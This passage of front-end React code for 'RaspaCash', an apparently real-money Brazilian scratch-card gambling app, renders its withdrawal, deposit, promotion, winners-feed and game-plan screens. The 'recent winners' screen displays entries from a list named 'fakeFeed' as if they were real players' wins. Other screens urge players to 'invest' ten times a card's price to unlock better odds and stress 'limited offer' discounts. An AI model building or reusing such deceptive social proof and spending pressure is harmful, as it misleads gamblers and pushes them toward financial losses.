            </div>
          </div>
          
          <form onSubmit={handleWithdraw} className="space-y-4">
            <div>
              <label className="block text-sm font-bold mb-2">Valor do Saque</label>
              <input
                type="number"
                value={withdrawAmount}
                onChange={(e) => setWithdrawAmount(e.target.value)}
                min="100"
                max={balance}
                step="0.01"
                required
                className="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white placeholder-white/50"
                placeholder="R$ 100,00 (m√≠nimo)"
              />
              <div className="text-xs text-yellow-300 mt-1">
                üí∞ Saldo dispon√≠vel: R$ {balance.toFixed(2)}
              </div>
            </div>

            <div>
              <label className="block text-sm font-bold mb-2">Nome Completo</label>
              <input
                type="text"
                value={withdrawData.fullName}
                onChange={(e) => setWithdrawData(prev => ({ ...prev, fullName: e.target.value }))}
                required
                className="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white placeholder-white/50"
                placeholder="Seu nome completo como no CPF"
              />
              <div className="text-xs text-yellow-300 mt-1">
                üë§ Nome igual ao documento de identidade
              </div>
            </div>

            <div>
              <label className="block text-sm font-bold mb-2">Tipo de Chave PIX</label>
              <select
                value={withdrawData.pixKeyType}
                onChange={(e) => setWithdrawData(prev => ({ ...prev, pixKeyType: e.target.value }))}
                className="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white"
              >
                <option value="cpf" className="bg-gray-800">CPF</option>
                <option value="email" className="bg-gray-800">E-mail</option>
                <option value="telefone" className="bg-gray-800">Telefone</option>
                <option value="aleatoria" className="bg-gray-800">Chave Aleat√≥ria</option>
              </select>
            </div>

            <div>
              <label className="block text-sm font-bold mb-2">Chave PIX</label>
              <input
                type="text"
                value={withdrawData.pixKey}
                onChange={(e) => setWithdrawData(prev => ({ ...prev, pixKey: e.target.value }))}
                required
                className="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white placeholder-white/50"
                placeholder={
                  withdrawData.pixKeyType === 'cpf' ? '000.000.000-00' :
                  withdrawData.pixKeyType === 'email' ? 'seu@email.com' :
                  withdrawData.pixKeyType === 'telefone' ? '(11) 99999-9999' :
                  'Chave aleat√≥ria do PIX'
                }
              />
              <div className="text-xs text-yellow-300 mt-1">
                üîë {
                  withdrawData.pixKeyType === 'cpf' ? 'Digite seu CPF (com ou sem pontos)' :
                  withdrawData.pixKeyType === 'email' ? 'E-mail cadastrado no seu banco' :
                  withdrawData.pixKeyType === 'telefone' ? 'Telefone cadastrado no PIX' :
                  'Chave aleat√≥ria gerada pelo seu banco'
                }
              </div>
            </div>
            
            <div>
              <label className="block text-sm font-bold mb-2">M√©todo de Pagamento</label>
              <div className="flex justify-center">
                <div className="p-4 rounded-lg border-2 border-purple-400 bg-gradient-to-br from-purple-400/30 to-pink-400/30 shadow-lg shadow-purple-400/20 w-48">
                  <div className="text-center">
                    <div className="text-3xl mb-2">üì±</div>
                    <div className="text-lg font-bold text-purple-200">PIX</div>
                    <div className="text-sm text-purple-300 mt-1">√önico m√©todo dispon√≠vel</div>
                  </div>
                </div>
              </div>
            </div>
            
            <button
              type="submit"
              disabled={
                isProcessingPayment ||
                !withdrawAmount || 
                parseFloat(withdrawAmount) < 100 || 
                parseFloat(withdrawAmount) > balance ||
                !withdrawData.fullName.trim() ||
                !withdrawData.pixKey.trim()
              }
              className={`w-full py-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-lg border-2 ${
                isProcessingPayment
                  ? 'bg-gray-500 cursor-not-allowed border-gray-400'
                  : withdrawAmount && 
                    parseFloat(withdrawAmount) >= 100 && 
                    parseFloat(withdrawAmount) <= balance &&
                    withdrawData.fullName.trim() &&
                    withdrawData.pixKey.trim()
                    ? 'bg-gradient-to-r from-purple-500 via-pink-500 to-red-500 hover:from-purple-600 hover:via-pink-600 hover:to-red-600 text-white border-purple-300'
                    : 'bg-gradient-to-r from-gray-500 to-gray-600 text-gray-300 cursor-not-allowed border-gray-400'
              }`}
            >
              {isProcessingPayment
                ? '‚è≥ Processando Saque...'
                : !withdrawAmount || parseFloat(withdrawAmount) < 100 
                ? 'üí∏ Saque M√≠nimo R$ 100' 
                : parseFloat(withdrawAmount) > balance 
                ? 'üí∏ Saldo Insuficiente'
                : !withdrawData.fullName.trim() || !withdrawData.pixKey.trim()
                ? 'üìù Preencha todos os dados'
                : `üí∏ Sacar R$ ${parseFloat(withdrawAmount).toFixed(2)} via PIX`
              }
            </button>
          </form>
          
          <button
            onClick={() => {
              setShowWithdraw(false);
              setWithdrawAmount('');
              setWithdrawData({ fullName: '', pixKey: '', pixKeyType: 'cpf' });
            }}
            className="w-full mt-4 bg-gray-600 hover:bg-gray-700 py-4 rounded-xl font-bold transition-all text-lg border-2 border-gray-400"
          >
            Cancelar
          </button>
        </div>
      </div>
    );
  }

  // Modal de dep√≥sito
  if (showDeposit) {
    return (
      <div className="w-full h-full bg-gradient-to-br from-indigo-600 via-purple-600 to-pink-600 p-4 text-white overflow-y-scroll relative" style={{ overscrollBehavior: 'contain' }}>
        {/* Efeitos de fundo */}
        <div className="absolute inset-0 opacity-30">
          <div className="absolute top-20 left-20 w-40 h-40 bg-yellow-400 rounded-full blur-2xl animate-pulse"></div>
          <div className="absolute bottom-20 right-20 w-32 h-32 bg-green-400 rounded-full blur-2xl animate-bounce"></div>
        </div>
        <div className="bg-gradient-to-br from-gray-900/90 to-purple-900/90 backdrop-blur-lg rounded-2xl p-4 sm:p-8 max-w-md w-full mx-auto my-4 border border-purple-400/50 shadow-2xl relative z-10">
          <div className="text-center mb-4 sm:mb-6">
            <h2 className="text-2xl sm:text-3xl font-bold mb-2 bg-gradient-to-r from-green-400 to-blue-400 bg-clip-text text-transparent">
              üí≥ Fazer Dep√≥sito üí≥
            </h2>
            <p className="text-base sm:text-lg text-yellow-300">Escolha o m√©todo de pagamento</p>
            <div className="flex justify-center space-x-2 mt-2">
              <span className="text-lg sm:text-xl animate-bounce">üí∞</span>
              <span className="text-lg sm:text-xl animate-pulse">üéØ</span>
              <span className="text-lg sm:text-xl animate-bounce">‚ö°</span>
            </div>
          </div>
          
          <form onSubmit={handleDeposit} className="space-y-4">
            <div>
              <label className="block text-sm font-bold mb-2">Valor do Dep√≥sito</label>
              <input
                type="number"
                value={depositAmount}
                onChange={(e) => setDepositAmount(e.target.value)}
                min="5"
                step="0.01"
                required
                className="w-full p-3 rounded-lg bg-white/20 border border-white/30 text-white placeholder-white/50"
                placeholder="R$ 0,00"
              />
            </div>
            
            <div>
              <label className="block text-sm font-bold mb-2">M√©todo de Pagamento</label>
              <div className="flex justify-center">
                <div className="p-4 rounded-lg border-2 border-green-400 bg-gradient-to-br from-green-400/30 to-emerald-400/30 shadow-lg shadow-green-400/20 w-48">
                  <div className="text-center">
                    <div className="text-3xl mb-2">üì±</div>
                    <div className="text-lg font-bold text-green-200">PIX</div>
                    <div className="text-sm text-green-300 mt-1">Pagamento instant√¢neo</div>
                  </div>
                </div>
              </div>
            </div>
            
            <button
              type="submit"
              disabled={isProcessingPayment}
              className={`w-full py-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-lg border-2 ${
                isProcessingPayment
                  ? 'bg-gray-500 cursor-not-allowed border-gray-400'
                  : 'bg-gradient-to-r from-green-500 via-emerald-500 to-teal-500 hover:from-green-600 hover:via-emerald-600 hover:to-teal-600 border-green-300'
              }`}
            >
              {isProcessingPayment ? '‚è≥ Gerando PIX...' : 'üöÄ Depositar via PIX ‚ö°'}
            </button>
          </form>
          
          <button
            onClick={() => setShowDeposit(false)}
            className="w-full mt-4 bg-gray-600 hover:bg-gray-700 py-4 rounded-xl font-bold transition-all text-lg border-2 border-gray-400"
          >
            Cancelar
          </button>
        </div>
      </div>
    );
  }

  // Modal de promo√ß√µes
  if (showPromotion) {
    return (
      <div className="w-full h-full bg-gradient-to-br from-yellow-500 via-orange-500 via-red-500 to-pink-500 p-4 text-white overflow-y-scroll relative" style={{ overscrollBehavior: 'contain' }}>
        {/* Efeitos de fundo promocional */}
        <div className="absolute inset-0 opacity-25">
          <div className="absolute top-10 left-10 w-40 h-40 bg-yellow-300 rounded-full blur-2xl animate-pulse"></div>
          <div className="absolute top-60 right-20 w-32 h-32 bg-orange-300 rounded-full blur-xl animate-bounce"></div>
          <div className="absolute bottom-40 left-1/4 w-48 h-48 bg-red-300 rounded-full blur-3xl animate-pulse"></div>
          <div className="absolute bottom-10 right-10 w-36 h-36 bg-pink-300 rounded-full blur-2xl animate-bounce"></div>
        </div>
        
        <div className="max-w-6xl mx-auto relative z-10">
          <div className="text-center mb-8">
            <h2 className="text-5xl font-bold mb-4 bg-gradient-to-r from-yellow-200 via-white to-yellow-200 bg-clip-text text-transparent animate-pulse">
              üî• SUPER PROMO√á√ÉO! üî•
            </h2>
            <p className="text-2xl text-yellow-100 font-bold">PACOTES ESPECIAIS COM DESCONTO!</p>
            <div className="flex justify-center space-x-3 mt-3">
              <span className="text-3xl animate-bounce">üí∞</span>
              <span className="text-3xl animate-pulse">üéÅ</span>
              <span className="text-3xl animate-bounce">‚ú®</span>
              <span className="text-3xl animate-pulse">üéâ</span>
              <span className="text-3xl animate-bounce">üíé</span>
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6 mb-8">
            {promotionalPacks.map(pack => {
              const originalPlan = plans.find(p => p.id === pack.planId);
              return (
                <div key={pack.id} className="bg-gradient-to-br from-gray-900/90 via-purple-900/90 to-blue-900/90 backdrop-blur-lg rounded-xl overflow-hidden border-4 border-yellow-400/60 shadow-2xl transform hover:scale-105 transition-all relative">
                  {/* Badge de desconto */}
                  <div className="absolute -top-3 -right-3 bg-gradient-to-r from-red-500 to-pink-500 text-white px-4 py-2 rounded-full text-sm font-bold animate-pulse z-10 shadow-lg">
                    -{pack.discount}% OFF!
                  </div>

                  <div className="h-48 overflow-hidden relative">
                    <img 
                      src={pack.image} 
                      alt={pack.name}
                      className="w-full h-full object-cover"
                    />
                    <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent"></div>
                  </div>
                  
                  <div className="p-6">
                    <div className={`inline-block px-4 py-2 rounded-full text-lg font-bold mb-4 bg-gradient-to-r ${pack.color} text-white shadow-lg animate-pulse`}>
                      üéÅ {pack.name} üéÅ
                    </div>
                    
                    <div className="bg-yellow-400/20 rounded-lg p-4 mb-4 border border-yellow-400/40">
                      <div className="text-center">
                        <div className="text-3xl font-bold text-yellow-300 mb-2">
                          {pack.quantity} RASPADINHAS
                        </div>
                        <div className="text-lg text-gray-300">
                          Baseado no {originalPlan?.name}
                        </div>
                      </div>
                    </div>
                    
                    <div className="space-y-3 text-base mb-6">
                      <div className="flex justify-between items-center">
                        <span>üí∞ Pr√™mio m√°ximo cada:</span>
                        <span className="font-bold bg-gradient-to-r from-green-400 to-emerald-400 bg-clip-text text-transparent">
                          R$ {originalPlan?.maxPrize.toLocaleString()}
                        </span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-red-300 line-through">üí∏ Pre√ßo normal:</span>
                        <span className="text-red-300 line-through font-bold">R$ {pack.originalPrice}</span>
                      </div>
                      <div className="flex justify-between items-center bg-green-400/20 rounded-lg p-2 border border-green-400/40">
                        <span className="font-bold text-green-300">üî• PRE√áO PROMOCIONAL:</span>
                        <span className="font-bold text-2xl text-green-200">R$ {pack.promoPrice}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-yellow-300">üíæ Economia:</span>
                        <span className="font-bold text-xl text-yellow-200">R$ {pack.originalPrice - pack.promoPrice}</span>
                      </div>
                    </div>
                    
                    <button
                      onClick={() => buyPromotionalPack(pack)}
                      disabled={balance < pack.promoPrice}
                      className={`w-full py-4 rounded-xl font-bold text-lg transition-all transform active:scale-95 shadow-lg border-2 ${
                        balance >= pack.promoPrice 
                          ? 'bg-gradient-to-r from-yellow-500 via-orange-500 to-red-500 hover:from-yellow-600 hover:via-orange-600 hover:to-red-600 text-white animate-bounce border-yellow-300' 
                          : 'bg-gradient-to-r from-gray-500 to-gray-600 text-gray-300 cursor-not-allowed border-gray-400'
                      }`}
                    >
                      {balance >= pack.promoPrice ? `üéÅ COMPRAR - R$ ${pack.promoPrice} üéÅ` : 'üí∏ Saldo Insuficiente'}
                    </button>
                  </div>
                </div>
              );
            })}
          </div>

          <div className="text-center bg-gradient-to-r from-red-500/20 to-pink-500/20 rounded-xl p-6 mb-6 border border-red-400/30">
            <div className="text-2xl font-bold text-red-200 mb-2">
              ‚è∞ OFERTA LIMITADA! ‚è∞
            </div>
            <div className="text-lg text-yellow-200">
              Aproveite os pacotes promocionais e economize at√© 40%!
            </div>
          </div>
          
          <button
            onClick={() => setShowPromotion(false)}
            className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 py-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-lg border-2 border-blue-300"
          >
            üîô Voltar ao Menu Principal
          </button>
        </div>
      </div>
    );
  }

  // Feed de ganhos
  if (showFeed) {
    return (
      <div className="w-full h-full bg-gradient-to-br from-green-600 via-teal-600 to-cyan-600 p-4 text-white relative overflow-y-scroll" style={{ overscrollBehavior: 'contain' }}>
        {/* Efeitos de fundo */}
        <div className="absolute inset-0 opacity-20">
          <div className="absolute top-10 left-10 w-32 h-32 bg-yellow-400 rounded-full blur-xl animate-pulse"></div>
          <div className="absolute top-40 right-20 w-24 h-24 bg-pink-400 rounded-full blur-xl animate-bounce"></div>
          <div className="absolute bottom-20 left-1/3 w-40 h-40 bg-purple-400 rounded-full blur-xl animate-pulse"></div>
        </div>
        <div className="max-w-2xl mx-auto relative z-10">
          <div className="text-center mb-6">
            <h2 className="text-3xl font-bold mb-2 bg-gradient-to-r from-yellow-400 via-orange-400 to-red-400 bg-clip-text text-transparent">
              üéâ Ganhos Recentes üéâ
            </h2>
            <p className="text-lg text-yellow-200">Veja quem est√° ganhando agora!</p>
            <div className="flex justify-center space-x-2 mt-2">
              <span className="text-2xl animate-bounce">üí∞</span>
              <span className="text-2xl animate-pulse">üèÜ</span>
              <span className="text-2xl animate-bounce">üíé</span>
            </div>
          </div>
          
          <div className="space-y-3 mb-6 max-h-96 overflow-y-auto">
            {fakeFeed.map((winner, index) => (
              <div key={index} className="bg-gradient-to-r from-purple-800/60 via-pink-800/60 to-red-800/60 backdrop-blur-sm rounded-lg p-4 flex items-center justify-between border border-yellow-400/30 transform hover:scale-105 transition-all shadow-lg">
                <div className="flex items-center space-x-3">
                  <div className="w-10 h-10 bg-gradient-to-br from-yellow-400 to-orange-500 rounded-full flex items-center justify-center text-white font-bold shadow-lg">
                    {winner.name.charAt(0)}
                  </div>
                  <div>
                    <div className="font-bold">{winner.name}</div>
                    <div className="text-sm opacity-75">Plano {winner.plan} ‚Ä¢ {winner.time}</div>
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-xl font-bold bg-gradient-to-r from-green-400 to-emerald-400 bg-clip-text text-transparent">R$ {winner.amount}</div>
                  <div className="text-xs text-yellow-300 font-bold animate-pulse">üéâ GANHOU! üéâ</div>
                </div>
              </div>
            ))}
          </div>
          
          <button
            onClick={() => setShowFeed(false)}
            className="w-full bg-blue-600 hover:bg-blue-700 py-4 rounded-xl font-bold transition-all text-lg border-2 border-blue-400"
          >
            Voltar ao Jogo
          </button>
        </div>
      </div>
    );
  }

  // Tela de sele√ß√£o de cartelas promocionais
  if (selectedPlan?.isPromo && promoCards.length > 0 && selectedPlan.currentCard === null) {
    return (
      <div className="w-full h-full bg-gradient-to-br from-purple-600 via-pink-600 to-red-600 p-4 text-white overflow-y-scroll relative" style={{ overscrollBehavior: 'contain' }}>
        {/* Efeitos de fundo */}
        <div className="absolute inset-0 opacity-20">
          <div className="absolute top-10 left-10 w-40 h-40 bg-yellow-400 rounded-full blur-2xl animate-pulse"></div>
          <div className="absolute top-60 right-20 w-32 h-32 bg-orange-300 rounded-full blur-xl animate-bounce"></div>
          <div className="absolute bottom-40 left-1/4 w-48 h-48 bg-red-300 rounded-full blur-3xl animate-pulse"></div>
        </div>

        <div className="max-w-4xl mx-auto relative z-10">
          <div className="text-center mb-8">
            <h2 className="text-3xl sm:text-4xl font-bold mb-4 bg-gradient-to-r from-yellow-400 via-white to-yellow-400 bg-clip-text text-transparent">
              üéÅ {selectedPlan.name} üéÅ
            </h2>
            <div className="bg-gradient-to-r from-green-500/20 to-emerald-500/20 rounded-xl p-4 border border-green-400/30 mb-4">
              <div className="text-lg sm:text-xl font-bold text-green-300">
                üí∞ Saldo: R$ {balance.toFixed(2)}
              </div>
              <div className="text-base text-yellow-200">
                üé´ Cartelas restantes: {selectedPlan.remainingGames} de {selectedPlan.quantity}
              </div>
            </div>
            <p className="text-lg text-yellow-200 mb-2">Escolha uma cartela para raspar!</p>
            <div className="flex justify-center space-x-2">
              <span className="text-2xl animate-bounce">üéØ</span>
              <span className="text-2xl animate-pulse">‚ú®</span>
              <span className="text-2xl animate-bounce">üé∞</span>
            </div>
          </div>

          {/* Grid de cartelas */}
          <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-4 mb-8">
            {promoCards.map((card, index) => (
              <div key={index} className="relative">
                <button
                  onClick={() => selectPromoCard(index)}
                  disabled={card.isUsed}
                  className={`w-full aspect-[3/4] rounded-xl border-2 transition-all transform hover:scale-105 shadow-lg relative overflow-hidden ${
                    card.isUsed 
                      ? 'opacity-50 bg-gray-600 border-gray-500 cursor-not-allowed' 
                      : `bg-gradient-to-br ${selectedPlan.color} border-yellow-400/60 hover:border-yellow-400 animate-pulse hover:animate-none`
                  }`}
                >
                  {card.isUsed ? (
                    <div className="absolute inset-0 flex flex-col items-center justify-center">
                      <div className="text-3xl mb-2">‚úÖ</div>
                      <div className="text-sm font-bold">USADA</div>
                    </div>
                  ) : (
                    <div className="absolute inset-0 flex flex-col items-center justify-center p-2">
                      <div className="text-2xl sm:text-3xl mb-2">üé∞</div>
                      <div className="text-xs sm:text-sm font-bold text-center">
                        Cartela #{index + 1}
                      </div>
                      <div className="text-xs text-yellow-200 mt-1">
                        Toque para raspar
                      </div>
                    </div>
                  )}
                </button>
                
                {/* Badge de pr√™mio oculto */}
                {!card.isUsed && (
                  <div className="absolute -top-2 -right-2 bg-gradient-to-r from-red-500 to-pink-500 text-white px-2 py-1 rounded-full text-xs font-bold animate-bounce shadow-lg">
                    ?
                  </div>
                )}
              </div>
            ))}
          </div>

          {/* Bot√£o voltar */}
          <div className="text-center">
            <button
              onClick={() => {
                setSelectedPlan(null);
                setPromoCards([]);
                setPrize(0);
                setScratchCard(null);
                setRevealedNumbers([]);
                setCellRevealStatus([]);
              }}
              className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 px-6 py-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-lg border-2 border-blue-300"
            >
              üîô Voltar ao Menu Principal
            </button>
          </div>
        </div>
      </div>
    );
  }

  if (!selectedPlan) {
    return (
      <div className="w-full h-full bg-gradient-to-br from-red-500 via-purple-600 via-blue-600 to-green-500 p-4 text-white overflow-y-scroll relative" style={{ overscrollBehavior: 'contain' }}>
        {/* Efeitos de fundo animados */}
        <div className="absolute inset-0 opacity-15">
          <div className="absolute top-20 left-20 w-48 h-48 bg-yellow-400 rounded-full blur-3xl animate-pulse"></div>
          <div className="absolute top-60 right-40 w-32 h-32 bg-pink-400 rounded-full blur-2xl animate-bounce"></div>
          <div className="absolute bottom-40 left-1/4 w-40 h-40 bg-cyan-400 rounded-full blur-2xl animate-pulse"></div>
          <div className="absolute bottom-20 right-20 w-36 h-36 bg-orange-400 rounded-full blur-2xl animate-bounce"></div>
          <div className="absolute top-1/2 left-1/2 w-28 h-28 bg-lime-400 rounded-full blur-xl animate-pulse"></div>
        </div>
        <div className="max-w-6xl mx-auto relative z-10">
          {/* Header */}
          <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 space-y-4 sm:space-y-0">
            <div>
              <h1 className="text-2xl sm:text-4xl font-bold bg-gradient-to-r from-yellow-400 via-pink-400 to-purple-400 bg-clip-text text-transparent">
                üé∞ RaspaCash üé∞
              </h1>
              <p className="text-sm sm:text-xl text-yellow-200">Ol√°, {user.name}! üëã</p>
              <div className="flex space-x-2 mt-1">
                <span className="text-sm sm:text-lg animate-bounce">üí∞</span>
                <span className="text-sm sm:text-lg animate-pulse">‚≠ê</span>
                <span className="text-sm sm:text-lg animate-bounce">üéØ</span>
              </div>
            </div>
            <div className="flex flex-wrap gap-2 w-full sm:w-auto">
              <div className="bg-gradient-to-r from-green-500 to-emerald-600 px-2 sm:px-4 py-1 sm:py-2 rounded-lg shadow-lg border border-yellow-400/30">
                <div className="text-xs sm:text-sm text-yellow-200">üí∞ Saldo</div>
                <div className="text-sm sm:text-lg font-bold text-white">R$ {balance.toFixed(2)}</div>
              </div>
              <button
                onClick={() => setShowWithdraw(true)}
                className="w-full sm:w-auto bg-gradient-to-r from-purple-500 to-pink-600 hover:from-purple-600 hover:to-pink-700 px-4 py-3 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-base"
              >
                üí∏ Sacar
              </button>
              <button
                onClick={() => setShowDeposit(true)}
                className="w-full sm:w-auto bg-gradient-to-r from-blue-500 to-cyan-600 hover:from-blue-600 hover:to-cyan-700 px-4 py-3 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-base"
              >
                üí≥ Depositar
              </button>
              <button
                onClick={() => setShowFeed(true)}
                className="w-full sm:w-auto bg-gradient-to-r from-orange-500 via-red-500 to-pink-500 hover:from-orange-600 hover:via-red-600 hover:to-pink-600 px-4 py-3 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg animate-pulse text-base"
              >
                üéâ Ganhos
              </button>
              <button
                onClick={() => setShowPromotion(true)}
                className="w-full sm:w-auto bg-gradient-to-r from-yellow-500 via-orange-500 to-red-500 hover:from-yellow-600 hover:via-orange-600 hover:to-red-600 px-6 py-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-2xl animate-bounce text-lg border-2 border-yellow-300"
              >
                üî• SUPER PROMO√á√ÉO! üî•
              </button>
            </div>
          </div>
          
          {/* Planos */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6 mb-6">
            {plans.map(plan => (
              <div key={plan.id} className="bg-gradient-to-br from-gray-900/80 via-purple-900/80 to-blue-900/80 backdrop-blur-lg rounded-xl overflow-hidden hover:from-gray-800/90 hover:via-purple-800/90 hover:to-blue-800/90 transition-all transform hover:scale-105 border border-yellow-400/30 shadow-2xl">
                <div className="h-48 overflow-hidden">
                  <img 
                    src={plan.image} 
                    alt={plan.name}
                    className="w-full h-full object-cover"
                  />
                </div>
                
                <div className="p-4 sm:p-6">
                  <div className={`inline-block px-3 py-1 rounded-full text-xs sm:text-sm font-bold mb-3 bg-gradient-to-r ${plan.color} text-white shadow-lg animate-pulse`}>
                    ‚≠ê {plan.name} ‚≠ê
                  </div>
                  
                  <p className="text-xs sm:text-sm mb-4 opacity-90">{plan.description}</p>
                  
                  <div className="space-y-2 text-xs sm:text-sm mb-4">
                    <div className="flex justify-between">
                      <span>üí∞ Ganho m√°ximo:</span>
                      <span className="font-bold bg-gradient-to-r from-green-400 to-emerald-400 bg-clip-text text-transparent">R$ {plan.maxPrize.toLocaleString()}</span>
                    </div>
                    <div className="flex justify-between">
                      <span>üé´ Custo:</span>
                      <span className="font-bold text-cyan-400">R$ {plan.cost}</span>
                    </div>
                    <div className="flex justify-between">
                      <span>üìä Taxa base:</span>
                      <span className="font-bold bg-gradient-to-r from-yellow-400 to-orange-400 bg-clip-text text-transparent">
                        {plan.id === 1 ? '15.0%' : plan.id === 2 ? '12.0%' : '8.0%'}
                      </span>
                    </div>
                    
                    {/* Sistema de Fidelidade */}
                    {(() => {
                      const sequence = loyaltySequences[plan.id];
                      const spendTarget = plan.cost * 10;
                      const loyaltyBonus = calculateLoyaltyBonus(plan.id);
                      const progress = Math.min((sequence.spent / spendTarget) * 100, 100);
                      
                      return (
                        <div className="bg-gradient-to-r from-purple-500/20 to-pink-500/20 rounded-lg p-3 border border-purple-400/30 mt-3">
                          <div className="flex justify-between items-center mb-2">
                            <span className="font-bold text-purple-300">üî• Sequ√™ncia Fidelidade:</span>
                            <span className="font-bold text-pink-300">
                              {loyaltyBonus > 0 ? `+${(loyaltyBonus * 100).toFixed(1)}%` : '0%'}
                            </span>
                          </div>
                          
                          <div className="flex justify-between text-xs mb-1">
                            <span>Investido: R$ {sequence.spent}</span>
                            <span>Meta: R$ {spendTarget}</span>
                          </div>
                          
                          <div className="w-full bg-gray-700 rounded-full h-2 mb-2">
                            <div 
                              className={`h-2 rounded-full transition-all duration-300 ${
                                progress >= 100 
                                  ? 'bg-gradient-to-r from-green-400 to-emerald-500' 
                                  : 'bg-gradient-to-r from-purple-400 to-pink-500'
                              }`}
                              style={{ width: `${progress}%` }}
                            ></div>
                          </div>
                          
                          <div className="text-xs text-center">
                            {progress >= 100 ? (
                              <span className="text-green-300 font-bold animate-pulse">
                                ‚ú® B√îNUS ATIVO! Chances aumentadas! ‚ú®
                              </span>
                            ) : progress === 0 ? (
                              <span className="text-purple-300 font-bold animate-pulse">
                                üî• Invista R$ {spendTarget} para DESBLOQUEAR b√¥nus de chances! üî•
                              </span>
                            ) : (
                              <span className="text-orange-300 font-bold animate-pulse">
                                üéØ Faltam R$ {(spendTarget - sequence.spent).toFixed(0)} para DESBLOQUEAR b√¥nus! üéØ
                              </span>
                            )}
                          </div>
                        </div>
                      );
                    })()}
                  </div>
                  
                  <button
                    onClick={() => startGame(plan)}
                    disabled={balance < plan.cost}
                    className={`w-full py-4 rounded-xl font-bold transition-all transform active:scale-95 shadow-lg text-base border-2 ${
                      balance >= plan.cost 
                        ? 'bg-gradient-to-r from-green-500 via-emerald-500 to-teal-500 hover:from-green-600 hover:via-emerald-600 hover:to-teal-600 text-white animate-pulse border-green-300' 
                        : 'bg-gradient-to-r from-gray-500 to-gray-600 text-gray-300 cursor-not-allowed border-gray-400'
                    }`}
                  >
                    {balance >= plan.cost ? `üé∞ Jogar - R$ ${plan.cost} üé∞` : 'üí∏ Saldo Insuficiente'}
                  </button>
                </div>
              </div>
            ))}
          </div>
          
          {/* Explica√ß√£o do Sistema de Fidelidade */}
          <div className="bg-gradient-to-r from-blue-500/20 to-purple-500/20 rounded-xl p-4 mb-4 border border-blue-400/30">
            <div className="text-center">
              <h3 className="text-lg font-bold text-blue-300 mb-2">
                üî• SISTEMA DE FIDELIDADE üî•
              </h3>
              <div className="text-sm text-blue-200 space-y-1">
                <p>üéØ <strong>SISTEMA ESPECIAL:</strong> Desbloqueie b√¥nus de chances progressivos!</p>
                <p>üí∞ <strong>Meta:</strong> Invista 10x o valor da cartela para ATIVAR b√¥nus</p>
                <p>‚ö° <strong>B√¥nus progressivo:</strong> +2% de chance a cada ciclo extra (m√°x 15%)</p>
                <p>üî• <strong>Exemplo:</strong> R$ 50 na cartela de R$ 5 = B√¥nus ativado + chances extras!</p>
              </div>
            </div>
          </div>
          
          <div className="text-center text-sm opacity-75">
            <p>‚ö†Ô∏è Jogue com responsabilidade. Este √© um jogo de azar. +18 anos.</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="w-full h-full bg-gradient-to-br from-pink-600 via-purple-700 via-blue-700 to-teal-600 p-4 text-white overflow-y-scroll relative" style={{ overscrollBehavior: 'contain' }}>
      {/* Efeitos de fundo da tela de jogo */}
      <div className="absolute inset-0 opacity-20">
        <div className="absolute top-10 left-10 w-32 h-32 bg-yellow-400 rounded-full blur-xl animate-pulse"></div>
        <div className="absolute top-40 right-20 w-24 h-24 bg-pink-400 rounded-full blur-xl animate-bounce"></div>
        <div className="absolute bottom-20 left-1/3 w-40 h-40 bg-cyan-400 rounded-full blur-xl animate-pulse"></div>
        <div className="absolute bottom-10 right-10 w-28 h-28 bg-orange-400 rounded-full blur-xl animate-bounce"></div>
      </div>
      <div className="text-center relative z-10 min-h-full flex flex-col justify-center py-4">
        <div className="mb-4">
          <h2 className="text-xl sm:text-3xl font-bold mb-2 bg-gradient-to-r from-yellow-400 via-pink-400 to-purple-400 bg-clip-text text-transparent">
            üéØ {selectedPlan.name} üéØ
          </h2>
          <div className="text-sm sm:text-xl bg-gradient-to-r from-green-400 to-emerald-400 bg-clip-text text-transparent font-bold">
            üí∞ Saldo: R$ {balance.toFixed(2)}
          </div>
          {selectedPlan.isPromo && (
            <div className="mt-2 bg-yellow-400/20 rounded-lg p-2 border border-yellow-400/40">
              <div className="text-sm text-yellow-200">
                üé´ Cartela {(selectedPlan.currentCard || 0) + 1} de {selectedPlan.quantity} | 
                Restantes: {selectedPlan.remainingGames}
              </div>
            </div>
          )}
          
          {/* Sistema de Fidelidade na tela de jogo */}
          {!selectedPlan.isPromo && scratchCard && (
            <div className="mt-2 bg-gradient-to-r from-purple-500/20 to-pink-500/20 rounded-lg p-3 border border-purple-400/30">
              <div className="text-center">
                <div className="text-sm font-bold text-purple-300 mb-1">
                  üî• Sequ√™ncia de Fidelidade üî•
                </div>
                {!scratchCard.hasReachedMinimum ? (
                  <div className="text-sm text-purple-300 font-bold animate-pulse">
                    üéØ Desbloqueie b√¥nus de chances investindo R$ {selectedPlan.cost * 10}! üéØ
                  </div>
                ) : scratchCard.loyaltyBonus > 0 ? (
                  <div className="text-sm text-green-300 font-bold animate-pulse">
                    ‚ú® B√îNUS ATIVO: +{(scratchCard.loyaltyBonus * 100).toFixed(1)}% de chance! ‚ú®
                  </div>
                ) : (
                  <div className="text-sm text-green-300 font-bold animate-pulse">
                    ‚úÖ B√îNUS DESBLOQUEADO! Chances de ganho ativadas! ‚úÖ
                  </div>
                )}
                <div className="text-sm text-purple-300">
